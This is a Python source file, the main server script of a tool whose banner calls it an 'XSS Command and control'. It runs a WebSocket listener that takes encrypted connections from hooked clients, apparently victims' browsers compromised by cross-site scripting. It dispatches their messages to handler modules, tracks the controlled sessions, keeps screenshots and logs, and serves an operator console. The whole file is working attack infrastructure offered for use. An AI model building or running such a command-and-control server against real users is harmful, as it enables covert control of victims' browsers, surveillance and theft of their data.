#!/usr/bin/env python

import asyncio
import argparse
import sys
import json
import logging
import server.server as httpServer
from websockets.asyncio.server import serve
from websockets import exceptions
from modules import getModules
import cryptoUtil
import socksUtil
import server.server as httpServer
import binascii
import os
import glob
import config
from modules.ConsoleServer import start_async_console_server
from modules.consoleModule import ConsoleInWeb

modules, defaultModule = getModules.getModules()
introString = "____ ____ ____ _  _ ____ ____ \n[__  |  | |     \\/  [__  [__  \n___] |__| |___ _/\\_ ___] ___] \n\nXSS Command and control"


class _IgnoreExpectedHandshakeAbort(logging.Filter):
    """Hide noisy traceback when a client disconnects mid-handshake."""

    def filter(self, record):
        if record.getMessage() != "opening handshake failed":
            return True
        if not record.exc_info:
            return True
        _, exc, _ = record.exc_info
        return not isinstance(exc, exceptions.ConnectionClosedError)


def configure_websocket_logging():
    ws_logger = logging.getLogger("websockets.server")
    ws_logger.addFilter(_IgnoreExpectedHandshakeAbort())

    ws_asyncio_logger = logging.getLogger("websockets.asyncio.server")
    ws_asyncio_logger.addFilter(_IgnoreExpectedHandshakeAbort())


def _iter_config_keys():
    for key in sorted(vars(config)):
        if key.isupper() and not key.startswith("_"):
            yield key


def _normalize_cli_tokens(argv):
    normalized = []
    for token in argv:
        if token.startswith("--") and token.endswith(":"):
            normalized.append(token[:-1])
            continue
        if token.startswith("--") and ":" in token and "=" not in token:
            opt, value = token.split(":", 1)
            if opt:
                normalized.extend([opt, value])
                continue
        normalized.append(token)
    return normalized


def _coerce_override_value(raw_value, current_value):
    value = raw_value.strip()
    if isinstance(current_value, bool):
        lowered = value.lower()
        if lowered in {"1", "true", "yes", "on"}:
            return True
        if lowered in {"0", "false", "no", "off"}:
            return False
        raise ValueError(f"Invalid boolean value: {raw_value}")
    if isinstance(current_value, int):
        return int(value)
    if current_value is None:
        lowered = value.lower()
        if lowered in {"none", "null", ""}:
            return None
        try:
            return int(value)
        except ValueError:
            return value
    return value


def parse_cli_args(argv):
    parser = argparse.ArgumentParser(allow_abbrev=False)
    parser.add_argument("-q", "--quiet", action="store_true", help="Suppress banner output")
    parser.add_argument("-f", "--fresh-start", action="store_true", help="Clean console logs/screenshots before start")

    for key in _iter_config_keys():
        parser.add_argument(f"--{key}", dest=key, type=str, help=f"Override config.{key}")

    return parser.parse_args(_normalize_cli_tokens(argv))


def apply_config_overrides(parsed_args):
    for key in _iter_config_keys():
        raw_value = getattr(parsed_args, key)
        if raw_value is None:
            continue
        current_value = getattr(config, key)
        try:
            coerced_value = _coerce_override_value(raw_value, current_value)
        except ValueError as exc:
            raise ValueError(f"Invalid value for --{key}: {raw_value}") from exc
        setattr(config, key, coerced_value)


async def exec(websocket):
    remote_ip = websocket.request.headers.get("CF-Connecting-IP") or (websocket.remote_address[0] if websocket.remote_address else "unknown")
    # In websockets.asyncio, path is in websocket.request.path
    sid = websocket.request.path.strip("/")
    print(f"Connected from {remote_ip} (SID: {sid})")
    
    # Store remote_ip on websocket for other modules to use
    websocket.remote_ip = remote_ip
    
    socksUtil.addSocket(websocket)
    try:
        while True:
            try:
                msg_enc = await websocket.recv()
                message_from_client = json.loads(cryptoUtil.decrypt(msg_enc, sid))
                handler = modules[defaultModule]
                if message_from_client["type"] in modules:
                    handler = modules[message_from_client["type"]]
                if "msg" in message_from_client:
                    await handler.handleMessage(websocket, message_from_client["msg"])
                else:
                    await handler.handleMessage(websocket, {"msg": "OK"})
            except exceptions.ConnectionClosed:
                raise
            except Exception as e:
                print(f"Message processing error from {remote_ip} (SID: {sid}): {e}")
    except exceptions.ConnectionClosed:
        print(f"Closed by client {remote_ip} (SID: {sid})")
    finally:
        if websocket in socksUtil.sockets:
            if socksUtil.sockets.index(websocket) == socksUtil.current:
                socksUtil.current = 0
            socksUtil.removeSocket(websocket)


async def main():
    # Start async HTTP server and Console server as asyncio tasks
    # Start HTTP server
    http_task = asyncio.create_task(httpServer.start_async_server())
    # Start Console server using the existing ConsoleInWeb instance from modules
    console_module = modules[ConsoleInWeb.type]
    asyncio.create_task(start_async_console_server(console_module))
    # Start WebSocket server using modern asyncio API and config values
    async with serve(exec, config.WS_HOST, config.WS_PORT, max_size=20 * 1024 * 1024):  # 20 MB limit for large screenshot responses
        await asyncio.get_running_loop().create_future()  # run forever


def clean_console():
    print("Cleaning console screenshots and logs...")
    for pattern in ["console/screenshots/*", "console/logs/*"]:
        for f in glob.glob(pattern):
            try:
                if os.path.isfile(f):
                    os.remove(f)
            except Exception as e:
                print(f"ERROR: Failed to remove {f}: {e}")
    print("Done.")

if __name__ == "__main__":
    args = parse_cli_args(sys.argv[1:])
    apply_config_overrides(args)
    configure_websocket_logging()
    if not args.quiet:
        print(introString)
    if args.fresh_start:
        clean_console()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nShutting down...")
